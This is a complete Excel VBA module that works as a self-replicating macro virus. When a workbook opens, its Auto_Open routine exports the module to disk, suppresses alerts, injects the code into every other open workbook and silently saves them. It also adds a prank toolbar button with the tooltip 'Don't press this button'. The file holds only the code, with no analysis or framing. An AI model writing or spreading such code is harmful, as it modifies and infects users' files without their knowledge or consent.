   Attribute VB_Name = "cmdButton"
   Option Explicit


   Private Sub RunChild()
       Dim cbar As CommandBar
       Dim cbarTool As CommandBarControl

       On Error Resume Next

           Set cbar = Application.CommandBars("Worksheet Menu Bar")
           If cbar.Controls(1).Tag <> "Happy" Then
               Set cbarTool = cbar.Controls.Add(msoControlButton, , , 1)
               With cbarTool
                   .FaceId = 59
                   .Tag = "Happy"
                   .OnAction = ""
                   .TooltipText = "Don't press this button"
                   .Style = msoButtonIcon
               End With
           End If
   End Sub

   Private Sub Auto_Open()
       Reproduce
       RunChild
   End Sub


   Private Sub Reproduce()
       Dim wb As Workbook
       Dim wbAct As Workbook
       Dim i As Integer, boolAdd As Boolean

       On Error Resume Next
       Set wbAct = activeworkbook
       wbAct.VBProject.VBComponents.Item("cmdbutton").Export "C:\cmdbutton.bas"

       Application.DisplayAlerts = False
       For Each wb In Workbooks
           boolAdd = True
           If wb.Name <> wbAct.Name Then
               wb.VBProject.References.AddFromFile ("C:\Program Files\Common Files\Microsoft Shared\VBA\VBEext1.olb")

               For i = 1 To wb.VBProject.VBComponents.count
                   If wb.VBProject.VBComponents(i).Name = "cmdButton" Then
                       boolAdd = False
                       Exit For
                   End If
               Next i

               If boolAdd = True Then
                   wb.VBProject.VBComponents.Import "C:\cmdbutton.bas"
               End If
           End If
           Application.ScreenUpdating = False
           wb.SAVE
           Application.ScreenUpdating = True
       Next wb
       Application.DisplayAlerts = True
   End Sub
